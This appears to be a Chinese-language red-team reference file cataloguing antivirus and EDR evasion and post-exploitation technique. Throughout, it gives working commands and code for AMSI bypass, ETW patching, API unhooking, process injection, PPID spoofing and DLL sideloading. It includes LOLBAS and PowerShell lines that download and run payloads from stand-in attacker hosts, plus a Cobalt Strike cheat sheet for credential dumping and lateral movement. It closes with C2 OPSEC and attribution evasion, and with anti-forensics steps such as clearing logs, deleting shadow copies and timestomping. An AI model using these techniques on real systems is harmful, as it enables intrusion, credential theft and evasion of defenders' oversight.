# 内网/后渗透 — 免杀与规避 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖: AMSI bypass / ETW patch / DLL sideload / 反沙箱 / unhook / Direct syscall / 混淆
> **新增**: Cobalt Strike 操作全流程 / 免杀技术集成模式(API Hashing/RWX分离/Syscall) / IOC对抗与基础设施OPSEC(JA3/JARM/域名/证书) / 磁盘反取证(安全删除/Timestomping/Artifact清除)

---

### PowerShell免杀  `evasion-powershell`
PowerShell脚本免杀技术
子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`

**前置条件：** 目标机器访问权限；Windows系统

**攻击链：**

**1. 编码执行**  _[windows]_
_Base64编码执行_
```
powershell -enc BASE64_ENCODED_COMMAND
```

**2. 远程加载**  _[windows]_
_远程加载脚本_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

**3. 混淆变量名**  _[windows]_
_变量名混淆_
```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
```

**4. 无文件执行**  _[windows]_
_隐藏窗口无配置文件执行_
```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
```

**EDR 绕过变体：**

**1. 降级执行**
_使用PowerShell v2绕过日志_
```
powershell -version 2 -c "command"
```

**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。

**OPSEC：** PowerShell日志可能记录命令；考虑禁用日志；使用混淆技术

---

### AMSI绕过  `amsi-bypass`
绕过反恶意软件扫描接口
子类：**AMSI绕过** · tags: `amsi` `bypass` `evasion`

**前置条件：** PowerShell环境；AMSI启用

**攻击链：**

**1. 反射绕过**  _[windows]_
_通过反射禁用AMSI_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

**2. 内存修补**  _[windows]_
_混淆版本绕过_
```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

**3. DLL劫持**  _[windows]_
_通过DLL劫持绕过_
```
替换或劫持amsi.dll
```

**4. 使用工具**  _[windows]_
_使用现成工具_
```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```

---

### ETW Patch绕过  `etw-patch`
禁用ETW监控
子类：**ETW** · tags: `etw` `bypass` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. PowerShell禁用ETW**  _[windows]_
_PowerShell禁用ETW_
```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
或
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

**2. C#禁用ETW**  _[windows]_
_C#禁用ETW_
```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

**3. 修补ntdll**  _[windows]_
_修补EtwEventWrite_
```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```

---

### API Unhooking  `api-unhooking`
移除EDR的API Hook
子类：**Unhooking** · tags: `unhooking` `hook` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 从磁盘还原**  _[windows]_
_从磁盘读取干净DLL_
```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# 找到.text段并覆盖
```

**2. 从KnownDlls还原**  _[windows]_
_从KnownDlls还原_
```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# 复制干净的代码段
```

**3. Hell's Gate**  _[windows]_
_Hell's Gate技术_
```
通过系统调用号直接调用:
1. 解析NTDLL获取系统调用号
2. 直接执行syscall
3. 绕过用户模式Hook
```

---

### 进程注入  `process-injection`
将代码注入到其他进程
子类：**进程注入** · tags: `injection` `process` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 经典DLL注入**  _[windows]_
_DLL注入_
```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```

**2. Process Hollowing**  _[windows]_
_进程镂空_
```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

**3. APC注入**  _[windows]_
_APC队列注入_
```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```

---

### AppLocker绕过  `applocker-bypass`
绕过AppLocker应用程序限制
子类：**AppLocker** · tags: `applocker` `bypass` `evasion`

**前置条件：** AppLocker限制环境

**攻击链：**

**1. 使用白名单路径**  _[windows]_
_使用白名单可执行文件_
```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

**2. LOLBAS利用**  _[windows]_
_LOLBAS技术_
```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

**3. InstallUtil**  _[windows]_
_InstallUtil绕过_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

**4. MSBuild**  _[windows]_
_MSBuild执行代码_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```

---

### BlockDLLs技术  `evasion-blockdlls`
阻止非微软DLL加载
子类：**BlockDLLs** · tags: `evasion` `blockdlls` `edr`

**前置条件：** Windows系统；Cobalt Strike或其他工具

**攻击链：**

**1. Cobalt Strike BlockDLLs**  _[windows]_
_启用BlockDLLs_
```
beacon> blockdlls start
阻止非微软签名的DLL加载
beacon> blockdlls stop
恢复DLL加载
```

**2. 进程创建时启用**  _[windows]_
_进程创建时启用_
```
使用CREATE_SUSPENDED标志创建进程
设置ProcessSignaturePolicy
阻止EDR DLL注入
```

**3. C#实现**  _[windows]_
_C#实现BlockDLLs_
```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```

---

### Shellcode加密  `evasion-shellcode-encrypt`
加密Shellcode绕过静态检测
子类：**Shellcode加密** · tags: `evasion` `shellcode` `encrypt`

**前置条件：** Shellcode；加密工具

**攻击链：**

**1. AES加密Shellcode**
_AES加密_
```
使用工具加密:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
生成加密的Shellcode和解密代码
```

**2. XOR加密**
_XOR加密_
```
简单XOR加密:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
运行时解密执行
```

**3. RC4加密**
_RC4加密_
```
使用RC4加密Shellcode:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
运行时使用相同密钥解密
```

**4. 多态加密**
_多态加密_
```
每次生成不同的解密代码:
- 随机密钥
- 随机解密顺序
- 添加垃圾指令
- 控制流混淆
```

---

### 进程伪装  `evasion-process-masq`
伪装进程名称和路径
子类：**进程伪装** · tags: `evasion` `process` `masquerade`

**前置条件：** Windows系统

**攻击链：**

**1. PPID欺骗**  _[windows]_
_PPID欺骗_
```
Cobalt Strike:
beacon> ppid 1234
设置父进程ID为合法进程
beacon> run [command]
新进程继承合法父进程
```

**2. 进程参数欺骗**  _[windows]_
_参数欺骗_
```
CreateProcess参数:
- lpApplicationName: 合法程序路径
- lpCommandLine: 包含恶意命令
- 显示为合法进程
```

**3. 进程镂空**  _[windows]_
_进程镂空_
```
1. 创建合法进程(挂起状态)
2. 写入恶意代码
3. 恢复线程执行
进程名显示为合法程序
```

---

### PPID欺骗  `evasion-ppid-spoof`
伪造父进程ID
子类：**PPID欺骗** · tags: `evasion` `ppid` `spoofing`

**前置条件：** Windows系统；父进程句柄

**攻击链：**

**1. PowerShell实现**  _[windows]_
_PowerShell PPID欺骗_
```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

**2. C#实现**  _[windows]_
_C#实现_
```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
新进程父进程为explorer.exe
```

---

### DLL侧加载  `evasion-dll-sideloading`
利用DLL搜索顺序加载恶意DLL
子类：**DLL侧加载** · tags: `evasion` `dll` `sideloading`

**前置条件：** Windows系统；可执行文件

**攻击链：**

**1. DLL劫持**  _[windows]_
_DLL劫持原理_
```
1. 找到可执行文件加载的DLL
2. 将恶意DLL放在搜索路径优先位置
3. 执行程序时加载恶意DLL
```

**2. DLL转发**  _[windows]_
_DLL转发_
```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
导出原始DLL的函数
同时执行恶意代码
```

**3. 常见目标**  _[windows]_
_常见目标DLL_
```
常见DLL劫持目标:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```

---

### 参数欺骗  `evasion-arg-spoofing`
欺骗进程参数显示
子类：**参数欺骗** · tags: `evasion` `argument` `spoofing`

**前置条件：** Windows系统

**攻击链：**

**1. 命令行欺骗**  _[windows]_
_命令行欺骗_
```
CreateProcess参数:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
实际执行恶意命令
```

**2. 环境变量欺骗**  _[windows]_
_环境变量欺骗_
```
使用环境变量隐藏参数:
set EVIL=malicious_command
cmd /c %EVIL%
进程列表不显示实际命令
```

**3. PEB修改**  _[windows]_
_PEB修改_
```
修改PEB中的命令行:
1. 创建进程
2. 修改PEB中的CommandLine缓冲区
3. 进程管理器显示假参数
```

---

### 签名二进制利用  `evasion-signed-binary`
利用微软签名二进制执行代码
子类：**签名二进制** · tags: `evasion` `signed` `lolbin`

**前置条件：** Windows系统

**攻击链：**

**1. MSBuild**  _[windows]_
_MSBuild执行_
```
msbuild.exe malicious.csproj
执行嵌入的C#代码
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**2. InstallUtil**  _[windows]_
_InstallUtil执行_
```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
执行.NET程序集
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

**3. Regsvcs/Regasm**  _[windows]_
_Regsvcs/Regasm_
```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
执行.NET程序集
```

**4. Rundll32**  _[windows]_
_Rundll32执行_
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```

---

### CLR注入  `evasion-clr-injection`
CLR内存注入技术
子类：**CLR注入** · tags: `evasion` `clr` `injection`

**前置条件：** Windows系统；.NET环境

**攻击链：**

**1. CLR内存加载**  _[windows]_
_CLR加载原理_
```
使用CLR接口加载.NET程序集:
1. 获取CLR运行时
2. 创建AppDomain
3. 加载程序集
4. 执行入口点
```

**2. C#实现**  _[windows]_
_C# CLR加载_
```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
从内存执行.NET程序
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
beacon> execute-assembly /path/to/tool.exe args
从内存执行.NET程序集
不落地执行
```

---



---

## 🎯 Cobalt Strike 操作工作流

> CS 实战操作全流程：TeamServer 部署 → Listener 选择 → Payload 生成 → Beacon 管理 → 后渗透命令速查

### Phase 1: TeamServer 部署

```
三层架构:
  攻击者 → Redirector(CDN/Nginx/Apache,多节点轮换) → TeamServer(隐藏,无公网暴露)
  被发现的只是 Redirector → 换个 IP/域名即可恢复

部署检查:
  [ ] TeamServer 不直接暴露公网 IP
  [ ] Redirector 配置完成 (socat/nginx stream/iPtables)
  [ ] TLS 证书为 Let's Encrypt 或商业证书 (禁用自签名)
  [ ] JA3/JARM 指纹匹配合法客户端
  [ ] Malleable C2 Profile 已定制 (非默认 profile)
  [ ] 域名 ≥30 天注册历史 + 已分类 (非新注册/非恶意分类)
```

### Phase 2: Listener 选择决策树

```
协议选择:
├─ HTTP/HTTPS → 最常用，CDN 域前置，出网 HTTP 可达
│   └─ HTTPS: 证书匹配目标环境 (Let's Encrypt 最常见，不突出)
├─ DNS → 高延迟低带宽，严格出网限制 (不出网 HTTP 但 DNS 出网)
│   └─ 适用: 不出网内网机器，通过 DNS TXT/A/AAAA 隧道
├─ SMB → 内网横向，命名管道通信
│   └─ 适用: 同网段 Windows 机器间横向
├─ SSH → 适用云环境/DevOps，21/22 端口少被监控
├─ Foreign → 接收外部 Beacon 连接 (如 DNS Beacon 回连)
└─ TCP → 原始 TCP socket，无 HTTP 特征
```

### Phase 3: Payload 生成

```
Staged vs Stageless:
├─ Staged (Stager): 初始载荷小(几KB)，拉取完整 Beacon
│   ├─ 优势: 体积小，适合漏洞利用 (buffer 有限)
│   └─ 劣势: 需要下载完整 payload，网络特征明显
└─ Stageless: 完整 Beacon 内嵌
    ├─ 优势: 不触发额外网络请求
    └─ 劣势: 体积大(200-300KB)

常用 Payload 格式:
  - PowerShell: powershell -enc BASE64 (脚本执行)
  - HTA: mshta http://redirector/a.hta (钓鱼常用)
  - Office Macro: VBA 内嵌 PowerShell
  - Windows Executable: .exe (受控测试环境)
  - DLL: rundll32 / regsvr32 侧加载
```

### Phase 4: Beacon 管理

```bash
# 核心参数
sleep 30 15          # 心跳30s，Jitter 15s (必须加 Jitter，不可固定间隔)
sleep 0              # 交互模式 (高频操作时临时使用)
spawnto x64 C:\Windows\System32\notepad.exe  # 注入到的进程 (选常见合法进程)
ppid <explorer_pid>                         # PPID 欺骗
blockdlls start                             # 阻止非微软签名 DLL 加载

# 后渗透命令速查
help                     # 命令列表
shell whoami             # 执行 cmd
powershell Get-Process   # 执行 PowerShell
execute c:\temp\tool.exe # 执行程序
execute-assembly /path/to/Seatbelt.exe  # 内存执行 .NET (不落盘)

# 凭据操作
hashdump                 # 导出本地 SAM hash
logonpasswords           # mimikatz sekurlsa::logonpasswords
steal_token <PID>        # 令牌窃取
make_token DOMAIN\user password  # 创建令牌
rev2self                 # 恢复原始令牌

# 横向移动
jump psexec10 IP         # PsExec 64位
jump winrm IP            # WinRM
remote-exec wmi IP cmd   # WMI 远程执行
inline-execute           # 内存横向 (不落盘 BOF)

# 文件与隧道
download C:\sensitive\file.txt  # 下载文件
upload /tmp/tool.exe C:\temp\   # 上传文件
socks 1080                      # 启用 SOCKS 代理
rportfwd 8080 LHOST 80          # 反向端口转发
```

### Phase 5: Malleable C2 Profile (OPSEC 核心)

```
必须定制的内容:
  [ ] User-Agent → 匹配目标环境真实浏览器
  [ ] URI 模式 → 模仿合法 SaaS API (/api/v1/events, /feed, /assets/style.css)
  [ ] HTTP Method → GET/POST 比例平衡
  [ ] Host Header → 合法域名
  [ ] 心跳间隔 → 30-60s + 30-50% Jitter
  [ ] 数据 padding → 避免固定大小响应包
  [ ] TLS 配置 → 使用合法浏览器 TLS 密码套件
  [ ] 证书 → 禁用自签名 (JA3S/JARM 特征明显)

Cobalt Strike 默认 profile 指征被大量 YARA/Sigma 规则覆盖 → 必须定制！
```

---

## 🔐 免杀技术集成模式

> 单一绕过技术不足以对抗 EDR，需组合多种技术构建完整绕过链

### 典型绕过链 (Windows)

```
Stage 1: 加载器
├─ DLL SideLoad → 利用合法签名EXE加载恶意DLL (version.dll/winmm.dll)
└─ LOLBAS → rundll32/mshta/regsvr32 执行

Stage 2: 内存操作
├─ API Hashing → 动态解析函数地址，消除 IAT 静态签名
├─ Syscall 替换 → 绕过用户层 Hook，直接 syscall (HellsGate/HalosGate)
└─ Unhook → 从 KnownDlls 还原干净 ntdll.dll

Stage 3: 载荷保护
├─ XOR/AES 加密 shellcode → 消除静态特征
├─ RW→RWX 权限分离 → 先 RW 写入再 RX 执行，避免 RWX 内存
└─ 分片加载 → 多段传输合并执行

Stage 4: I/O 隐藏
├─ ETW Patch → 禁用 ETW 日志
├─ AMSI Bypass → 禁用脚本扫描
└─ BlockDLLs → 阻止 EDR 注入
```

### 兼容性矩阵速查

| 加载方式 | API Hashing | XOR 加密 | RWX 分离 | Unhook | Syscall |
|---------|------------|---------|---------|--------|---------|
| DLL SideLoad | ✓ | ✓ | ✓ | ✓ | ✓ |
| PowerShell | — | ✓ | — | ✓ | — |
| .NET execute-assembly | ✓ | ✓ | ✓ | ✓ | ✓ |
| Shellcode 注入 | ✓ | ✓ | ✓ | ✓ | ✓ |
| LOLBAS | — | ✓ | — | — | — |

---

## 🕵️ IOC 对抗与基础设施 OPSEC

> 理解蓝队如何追踪你 → 设计短生命周期、不可关联的基础设施

### C2 基础设施设计

```
分层架构:
  攻击者 → Redirectors(多个/轮换) → TeamServer(隐藏)
  ├─ Redirector: CDN (Cloudflare/Azure CDN/AWS CloudFront) 或反向代理
  │   └─ 被标记后换一个节点即可恢复
  ├─ 域名策略:
  │   ├─ 注册 30 天以上的域名 (新域名有风险评分)
  │   ├─ 使用合法分类的域名 (非新注册/非恶意分类)
  │   ├─ 域前置 (Domain Fronting) → CDN 背后真正的 C2
  │   └─ 使用被接管的合法子域名 (更可信)
  ├─ IP 策略:
  │   ├─ 使用云服务商 IP (AWS/Azure/GCP) → 难以封锁
  │   ├─ 每次行动新建 VPS → 不复用 IP
  │   └─ 使用 CDN/反代 → 隐藏真实 IP
  └─ 证书策略:
      ├─ 使用 Let's Encrypt 证书 (最常见，不突出)
      ├─ 或购买与目标同类的商业证书
      └─ ⛔ NEVER 使用自签名证书 → JA3S/JARM 特征明显
```

### JA3/JARM 指纹对抗

```bash
# 蓝队检测点:
# JA3 (客户端 TLS 指纹) → 识别 C2 客户端
# JA3S (服务端 TLS 指纹) → 识别 C2 服务器
# JARM → C2 服务端主动指纹

# 红队对策:
# 1. 使用合法浏览器 TLS 库配置 (非默认 C2 framework TLS)
# 2. 修改 CS profile 中的 TLS 密码套件列表
# 3. 使用 CDN 前置 → JARM 扫到的是 CDN 指纹而非 C2
# 4. 检查: https://ja3er.com/ (JA3 查询)
#           https://github.com/salesforce/jarm (JARM 计算工具)
```

### 归因对抗

```
防止不同行动被关联到同一组织:
├─ 不同行动使用完全独立的基础设施 (不同 VPS 服务商、不同域名注册商)
├─ 工具重新编译 (不同编译器/选项/编译时间 → Imphash 变化)
├─ 不复用 C2 Profile / Malleable 模板
├─ 支付使用加密货币 → Monero 优于 Bitcoin
├─ 时区/语言特征随机化 (编译时间、元数据语言)
└─ Payload 自毁 → 执行后删除自身 (最短驻留时间)
```

### IOC 生命周期缩短

```
让蓝队收集到的 IOC 快速过时:
├─ 短期 C2 域名 → 48h 后切换
├─ 一次性 Payload → 每个目标唯一编译 (SHA256 不重复)
├─ 短期 VPS → 行动结束即销毁
├─ 快速阶段切换 → 初始访问 ≠ 驻留 ≠ 数据外传 (不同基础设施)
└─ YARA 规则对抗 → 修改字符串常量/编译选项/代码结构每版本不同
```

---

## 🧹 磁盘反取证

> 蓝队从磁盘恢复证据 vs 红队确保证据不可恢复

### 安全删除 (不可恢复)

```bash
# ⛔ 普通 rm/del 只删除 MFT 条目，数据仍在磁盘！

# Linux 安全删除
shred -vfz -n 3 target_file      # 多次覆写+零填充
srm -sz target_file               # 安全删除

# Windows 安全删除
cipher /w:C:\temp\                # 覆写可用空间
sdelete -p 3 target_file          # Sysinternals 安全删除

# 最佳实践: 内存文件系统操作 (不触盘)
mkdir /dev/shm/.work && cd /dev/shm/.work      # Linux tmpfs
# Windows: Named Pipe / 内存映射文件
```

### 时间戳篡改 (Timestomping)

```bash
# Linux: touch 修改 atime/mtime
touch -t 202301011200.00 malware.elf    # 伪装成旧文件
touch -r /bin/ls malware.elf            # 匹配合法文件时间

# Windows: PowerShell
$(Get-Item file.exe).CreationTime = "01/01/2023 12:00:00"
$(Get-Item file.exe).LastWriteTime = "01/01/2023 12:00:00"
$(Get-Item file.exe).LastAccessTime = "01/01/2023 12:00:00"

# ⛔ NTFS 有 4 组时间戳：$STANDARD_INFORMATION (可改) vs $FILE_NAME (需底层操作)
# 蓝队对比两组时间差异 → 发现 timestomping → 需要同时修改 $FN 时间
```

### Artifact 清除清单

```
Windows 操作后清除:
├─ Prefetch → 删除 C:\Windows\Prefetch\TOOLNAME-*.pf
├─ USN Journal → fsutil usn deletejournal /d C:
├─ Event Log → wevtutil cl Security/System/Application
├─ Recent/LNK → 删除 %APPDATA%\Microsoft\Windows\Recent\*
├─ Jump Lists → 删除 CustomDestinations\*
├─ Amcache → 注册表清理 (需 SYSTEM 权限)
└─ VSS → vssadmin delete shadows /all (删除卷影副本)

Linux 操作后清除:
├─ .bash_history → unset HISTFILE && export HISTSIZE=0
├─ /var/log/ → 精准修改单行 (sed -i)，不要清空全文件 (会被发现)
├─ wtmp/btmp → utmpdump → 编辑 → utmpdump -r 写回
├─ journal → journalctl --vacuum-time=1h
└─ /tmp/ 文件 → shred 后删除
```

### OPSEC 最佳实践 (预防 > 清除)

```
├─ 工具不落盘 → 内存执行 (反射加载/fileless / execute-assembly)
├─ 使用 RAM 磁盘 → /dev/shm 或 tmpfs
├─ 操作前 unset HISTFILE → 不记录命令历史
├─ 使用 LOLBins → 不引入新文件到磁盘
├─ 通过管道传输 → curl attacker.com/payload | python 不落盘
├─ 加密落盘文件 → 即使被发现也无法分析
└─ 最短驻留时间 → 用完即销毁，行动时间窗口最小化
```

---
